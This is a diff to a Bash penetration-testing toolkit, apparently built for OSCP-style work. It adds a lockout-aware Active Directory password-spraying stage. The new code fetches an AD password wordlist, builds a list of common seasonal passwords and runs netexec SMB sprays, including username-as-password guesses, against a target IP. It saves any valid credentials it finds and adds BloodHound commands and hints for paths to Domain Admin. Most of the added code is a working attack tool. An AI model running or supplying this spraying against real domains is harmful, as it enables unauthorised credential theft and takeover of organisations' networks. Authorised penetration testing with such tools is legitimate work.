@@ -21,6 +21,7 @@ ad_attacker_ip() {
 
 _ad_ask() {
     local prompt="$1" default="$2"
+    local __pre; if declare -F _ar_preseed >/dev/null && __pre=$(_ar_preseed "$prompt"); then printf '%s\n' "$__pre"; return 0; fi
     if declare -F tui_input >/dev/null && tui_enabled; then
         tui_input "$prompt" "$default"
     else
@@ -29,16 +30,17 @@ _ad_ask() {
     fi
 }
 
-# Run an external command: preview (-> PoC file via log_command_preview),
-# execute with a timeout, and tee output to a file + terminal.
+# Run an external command: preview (-> PoC file + visible on stderr via
+# log_command_preview), execute with a timeout, save output to a file AND
+# stream it live to the terminal (stderr) so you always see command + output.
+# run_timed already calls log_command_preview, so we don't double-preview here.
 _ad_run() {
     local outfile="$1"; shift
-    log_command_preview "$@"
     if [[ -n "$outfile" ]]; then
-        run_timed "${TOOL_TIMEOUT:-420}" "$@" 2>&1 | tee "$outfile"
+        run_timed "${TOOL_TIMEOUT:-420}" "$@" 2>&1 | tee "$outfile" >&2
         return "${PIPESTATUS[0]}"
     else
-        run_timed "${TOOL_TIMEOUT:-420}" "$@" 2>&1
+        run_timed "${TOOL_TIMEOUT:-420}" "$@" >&2 2>&1
     fi
 }
 
@@ -160,6 +162,151 @@ ad_asrep_roast() {
         echo -e "    ${YELLOW}Crack:${NC} hashcat -m 18200 ${out} \$(rockyou)"
     else
         log_info "No AS-REP-roastable users (DONT_REQ_PREAUTH not set)"
+    fi
+}
+
+# ── Stage 2.5: password spraying (lockout-aware) ───────────────────────────
+# Fallback AD password wordlist (Cryilllic) — chỉ tải khi chưa có list nào khác.
+AD_PASS_WORDLIST_URL="${AD_PASS_WORDLIST_URL:-https://raw.githubusercontent.com/Cryilllic/Active-Directory-Wordlists/master/Passwords.txt}"
+
+# Tìm một AD password wordlist lớn hơn (optional, graceful):
+#   1) bản cache local  2) seclists trên Kali  3) tải Cryilllic AD-Wordlists.
+ad_resolve_pass_wordlist() {
+    local cache="${BASE_DIR:-.}/wordlists/ad_passwords.txt"
+    [[ -s "$cache" ]] && { echo "$cache"; return 0; }
+    local p
+    for p in \
+        /usr/share/seclists/Passwords/Common-Credentials/best1050.txt \
+        /usr/share/wordlists/seclists/Passwords/Common-Credentials/best1050.txt; do
+        [[ -s "$p" ]] && { echo "$p"; return 0; }
+    done
+    # Không có sẵn → thử tải Cryilllic (chỉ khi online), rồi cache lại.
+    mkdir -p "$(dirname "$cache")" 2>/dev/null
+    if have_tool curl; then
+        log_command_preview curl -fsSL --max-time 20 "$AD_PASS_WORDLIST_URL"
+        curl -fsSL --max-time 20 "$AD_PASS_WORDLIST_URL" -o "$cache" 2>/dev/null
+    elif have_tool wget; then
+        log_command_preview wget -qO "$cache" "$AD_PASS_WORDLIST_URL"
+        wget -q --timeout=20 -O "$cache" "$AD_PASS_WORDLIST_URL" 2>/dev/null
+    fi
+    if [[ -s "$cache" ]]; then
+        # NOTE: this function's stdout is captured (big=$(ad_resolve_pass_wordlist)),
+        # so the log line MUST go to stderr or it pollutes the returned path.
+        log_success "AD wordlist (Cryilllic) đã tải → ${cache}" >&2
+        echo "$cache"; return 0
+    fi
+    rm -f "$cache" 2>/dev/null
+    return 1
+}
+
+# Build the spray list: seasonal/common (luôn có, ưu tiên trước) + một phần
+# của AD wordlist lớn. Cap lại để tránh lockout (đổi qua AD_SPRAY_MAX).
+ad_default_passlist() {
+    local d="$1"
+    local out="${d}/spray_passwords.txt"
+    [[ -s "$out" ]] && { echo "$out"; return 0; }
+    local year prev; year=$(date +%Y); prev=$((year - 1))
+    {
+        cat <<EOF
+Password1
+Password123!
+Welcome1
+Welcome123!
+P@ssw0rd
+P@ssw0rd!
+Passw0rd!
+Spring${year}!
+Summer${year}!
+Autumn${year}!
+Winter${year}!
+Spring${prev}!
+Winter${prev}!
+Company123!
+Changeme123!
+EOF
+        local big; big=$(ad_resolve_pass_wordlist)
+        [[ -n "$big" && -s "$big" ]] && cat "$big"
+    } | awk 'NF && !seen[$0]++' | head -n "${AD_SPRAY_MAX:-40}" > "$out"
+    echo "$out"
+}
+
+# Phase F: parse the account-lockout threshold from a captured pass-pol file.
+# Echoes an integer (0 = "none/unlimited") or nothing if it couldn't be read.
+ad_passpol_lockout_threshold() {
+    local f="$1"
+    [[ -s "$f" ]] || return 1
+    local n
+    # nxc --pass-pol / rpcclient getdompwinfo / enum4linux wording all covered.
+    n=$(grep -aiE 'lockout( account)? threshold|Account Lockout Threshold' "$f" 2>/dev/null | head -1 | grep -oiE '[0-9]+|none' | head -1)
+    [[ -z "$n" ]] && return 1
+    [[ "${n,,}" == "none" ]] && { echo 0; return 0; }
+    echo "$n"; return 0
+}
+
+# Spray passwords across the harvested userlist. ONE password at a time
+# (true spraying) to respect lockout policy. Captures valid creds.
+ad_password_spray() {
+    local ip="$1" result_dir="$2"
+    local d; d=$(ad_dir "$result_dir")
+    local nxc; nxc=$(ad_smb_tool)
+    [[ -n "$nxc" ]] || { log_warn "netexec/crackmapexec missing — skip password spray"; return 0; }
+    local users="${d}/users.txt"
+    [[ -s "$users" ]] || { log_info "No users.txt yet — chạy Unauth enum (1) trước khi spray"; return 0; }
+
+    sub_header "Password Spraying (nxc — lockout-aware)"
+    log_warn "Kiểm tra lockout threshold ở ad/nxc_passpol.txt TRƯỚC khi spray (tránh khoá tài khoản!)"
+
+    # Phase F: auto-cap attempts below the lockout threshold so we never lock accounts.
+    local threshold; threshold=$(ad_passpol_lockout_threshold "${d}/nxc_passpol.txt")
+    if [[ -n "$threshold" ]]; then
+        if (( threshold == 0 )); then
+            log_info "Lockout threshold: ${BOLD}none${NC} — spraying is safe."
+        else
+            # leave a 1-attempt safety margin (threshold-1), and never below 1.
+            local safe_cap=$(( threshold > 1 ? threshold - 1 : 1 ))
+            if (( AD_SPRAY_MAX > safe_cap )); then
+                log_warn "Lockout threshold=${threshold} → capping spray at ${BOLD}${safe_cap}${NC} password(s) (was ${AD_SPRAY_MAX})."
+                AD_SPRAY_MAX="$safe_cap"
+            else
+                log_info "Lockout threshold=${threshold}; AD_SPRAY_MAX=${AD_SPRAY_MAX} already safe."
+            fi
+        fi
+    else
+        log_warn "Lockout threshold unknown — keeping AD_SPRAY_MAX=${AD_SPRAY_MAX}. Verify manually!"
+    fi
+
+    local domflag=(); [[ -n "$AD_DOMAIN" ]] && domflag=(-d "$AD_DOMAIN")
+    local hits="${d}/spray_hits.txt"; : > "$hits"
+    : > "${d}/spray_run.txt"
+
+    # 1) username == password (line-by-line, không cartesian)
+    log_scan "Thử username==password"
+    _ad_run "${d}/spray_useraspass.txt" "$nxc" smb "$ip" "${domflag[@]}" -u "$users" -p "$users" --no-bruteforce --continue-on-success
+    grep -aE '\[\+\]' "${d}/spray_useraspass.txt" 2>/dev/null >> "$hits"
+
+    # 2) curated/seasonal list — MỘT password / lượt (spray an toàn)
+    local plist; plist=$(ad_default_passlist "$d")
+    if [[ "${INTERACTIVE:-true}" == "true" ]]; then
+        local extra; extra=$(_ad_ask "Wordlist password riêng (Enter = dùng list mặc định)" "")
+        [[ -n "$extra" && -f "$extra" ]] && plist="$extra"
+    fi
+    log_scan "Spray $(wc -l < "$plist" 2>/dev/null) password qua $(wc -l < "$users" 2>/dev/null) user"
+    local pw
+    while IFS= read -r pw; do
+        [[ -z "$pw" ]] && continue
+        _ad_run "${d}/spray_tmp.txt" "$nxc" smb "$ip" "${domflag[@]}" -u "$users" -p "$pw" --continue-on-success
+        grep -aE '\[\+\]' "${d}/spray_tmp.txt" 2>/dev/null >> "$hits"
+        cat "${d}/spray_tmp.txt" >> "${d}/spray_run.txt" 2>/dev/null
+    done < "$plist"
+    rm -f "${d}/spray_tmp.txt"
+
+    if [[ -s "$hits" ]]; then
+        sort -u "$hits" -o "$hits"
+        print_found "Credential HỢP LỆ từ spray → ${hits}"
+        sed 's/^/    /' "$hits"
+        echo -e "    ${YELLOW}Tiếp:${NC} dùng creds này ở 'Authenticated enum' (mục 3)"
+    else
+        log_info "Spray không ra credential nào"
     fi
 }
 
@@ -302,10 +449,20 @@ ad_summary() {
         echo "Domain:        ${AD_DOMAIN:-unknown}"
         echo "DC host:       ${AD_DC_HOST:-unknown}"
         echo "Domain users:  ${users_n}"
+        echo "Spray creds:   $([[ -s "${d}/spray_hits.txt" ]] && echo "YES → ad/spray_hits.txt" || echo no)"
         echo "AS-REP hashes: $([[ -s "${d}/asrep_hashes.txt" ]] && echo yes || echo no)"
         echo "Kerberoast:    $([[ -s "${d}/kerberoast_hashes.txt" ]] && echo yes || echo no)"
         echo "ADCS vuln:     $(grep -qiE 'ESC[0-9]' "${d}/certipy_find.txt" 2>/dev/null && echo yes || echo 'no/unknown')"
         echo "Admin (Pwn3d): $(grep -qi 'Pwn3d!' "${d}"/auth_*.txt 2>/dev/null && echo yes || echo 'no/unknown')"
+        # Phase F: BloodHound shortest-path hint driven by what we actually collected.
+        local bh_zip; bh_zip=$(ls "${d}/bloodhound/"*.zip "${d}/bloodhound/"*.json 2>/dev/null | head -1)
+        if [[ -n "$bh_zip" ]]; then
+            echo "BloodHound:    data present → ${bh_zip#${result_dir}/}"
+            echo "  ↳ upload it, mark owned users, run pre-built query 'Shortest Path to Domain Admins'"
+            echo "  ↳ also check: 'Shortest Paths to Unconstrained Delegation' & Kerberoastable→DA"
+        else
+            echo "BloodHound:    none yet → collect with:  bloodhound-python -d ${AD_DOMAIN:-DOMAIN} -u USER -p PASS -ns ${ip} -c All"
+        fi
         echo ""
         echo "Next steps:"
         echo "  - crack hashes (see crack_hints.txt) -> reuse creds (spray with nxc)"
@@ -331,6 +488,14 @@ run_ad_enum() {
 
     if [[ "${INTERACTIVE:-true}" != "true" ]]; then
         ad_null_enum "$ip" "$result_dir"
+        # Auto password spraying can trip account-lockout policies. Skip it in
+        # OSCP-safe mode (same contract that gates sqlmap/nuclei/dalfox); it
+        # stays available on-demand via the AD menu [8].
+        if [[ "${OFFSEC_OSCP_SAFE_MODE:-false}" == "true" ]]; then
+            log_info "OSCP-safe: skip auto password spray (lockout risk) — run AD menu [8] manually if wanted"
+        else
+            ad_password_spray "$ip" "$result_dir"
+        fi
         ad_asrep_roast "$ip" "$result_dir"
         ad_crack_hints "$result_dir"
         ad_summary "$ip" "$result_dir"
@@ -346,6 +511,7 @@ run_ad_enum() {
             sel=$(tui_choose "Chọn bước" \
                 "1  👻 Unauth enum (null/guest/RID/LDAP)" \
                 "2  🔥 AS-REP roast (no creds)" \
+                "8  💦 Password spray (dùng users.txt)" \
                 "3  🔑 Authenticated enum (creds/hash)" \
                 "4  📜 ADCS (certipy)" \
                 "5  📡 Relay/Coercion handoff" \
@@ -356,13 +522,14 @@ run_ad_enum() {
             choice="${sel%%[[:space:]]*}"
         else
             sub_header "AD Attack Path"
-            echo -e "  [1] Unauth enum  [2] AS-REP roast  [3] Auth enum  [4] ADCS"
-            echo -e "  [5] Relay handoff  [6] Crack hints  [7] Summary  [0] Back"
+            echo -e "  [1] Unauth enum  [2] AS-REP roast  [8] Password spray  [3] Auth enum"
+            echo -e "  [4] ADCS  [5] Relay handoff  [6] Crack hints  [7] Summary  [0] Back"
             echo -ne "  ${BOLD}Choose:${NC} "; read -r choice
         fi
         case "$choice" in
             1) ad_null_enum "$ip" "$result_dir" ;;
             2) ad_asrep_roast "$ip" "$result_dir" ;;
+            8) ad_password_spray "$ip" "$result_dir" ;;
             3) ad_with_creds "$ip" "$result_dir" ;;
             4) ad_with_creds "$ip" "$result_dir" ;;   # ADCS prompts within
             5) ad_relay_handoff "$ip" "$result_dir" ;;
@@ -371,6 +538,6 @@ run_ad_enum() {
             0|"") return 0 ;;
             *) log_warn "Unknown: $choice"; sleep 1 ;;
         esac
-        [[ "$choice" =~ ^[1-7]$ ]] && { echo -e "  ${YELLOW}Press Enter...${NC}"; read -r; }
+        [[ "$choice" =~ ^[1-8]$ ]] && { echo -e "  ${YELLOW}Press Enter...${NC}"; read -r; }
     done
 }
